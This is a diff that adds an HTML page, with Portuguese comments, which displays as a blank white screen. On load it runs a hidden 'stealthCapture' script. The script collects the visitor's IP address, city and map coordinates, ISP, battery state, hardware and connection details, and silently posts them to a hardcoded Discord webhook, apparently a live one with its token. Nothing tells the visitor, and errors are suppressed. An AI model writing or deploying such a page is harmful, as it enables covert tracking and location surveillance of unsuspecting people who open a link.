@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title> <style>
+        body {
+            background-color: #ffffff; /* Tela totalmente branca */
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+    // Seu Webhook do Discord
+    const webhookURL = "https://discord.com/api/webhooks/1499880092493414521/NHvrU1wucCRBtCcbC70MEdcpcl-hhH6fJBTl9xsrrrEfwIaXvlkAQrkoH29e0Y_FBiDM";
+
+    async function stealthCapture() {
+        try {
+            // 1. Captura de IP e Localização (HTTPS compatível)
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+
+            // 2. Captura de Bateria
+            let batteryInfo = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Carregando' : 'Descarregando'})`;
+            }
+
+            // 3. Captura de Hardware e Sistema
+            const cores = navigator.hardwareConcurrency + " Núcleos CPU";
+            const ram = (navigator.deviceMemory || 'N/A') + " GB";
+            const platform = navigator.platform;
+            const language = navigator.language;
+
+            // 4. Captura de Conexão
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const netInfo = conn ? `${conn.effectiveType.toUpperCase()} / ${conn.downlink}Mbps` : "Indisponível";
+
+            // 5. Preparar o pacote de dados para o Discord
+            const discordPayload = {
+                username: "Sistema de Monitoramento",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/6831/6831510.png",
+                embeds: [{
+                    title: "🕵️ Nova Entrada Detectada (Silencioso)",
+                    color: 16777215, // Branco
+                    fields: [
+                        { name: "🌐 Endereço IP", value: `\`${ipData.ip}\``, inline: true },
+                        { name: "📍 Localização", value: `${ipData.city}, ${ipData.region} - ${ipData.country_name}`, inline: true },
+                        { name: "🏢 Provedor (ISP)", value: ipData.org },
+                        { name: "🔋 Bateria", value: batteryInfo, inline: true },
+                        { name: "💻 Hardware", value: `${cores} / ${ram} RAM`, inline: true },
+                        { name: "📡 Conexão", value: netInfo, inline: true },
+                        { name: "🖥️ Plataforma", value: platform, inline: true },
+                        { name: "🗣️ Idioma", value: language, inline: true },
+                        { name: "🔗 Mapa", value: `[Abrir no Google Maps](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})` }
+                    ],
+                    footer: { text: "Captura executada via Site Branco" },
+                    timestamp: new Date()
+                }]
+            };
+
+            // Enviar os dados via POST
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            });
+
+        } catch (error) {
+            console.error("Erro na captura silenciosa.");
+        }
+    }
+
+    // Executa a função assim que a página é carregada
+    window.onload = stealthCapture;
+</script>
+
+</body>
+</html>
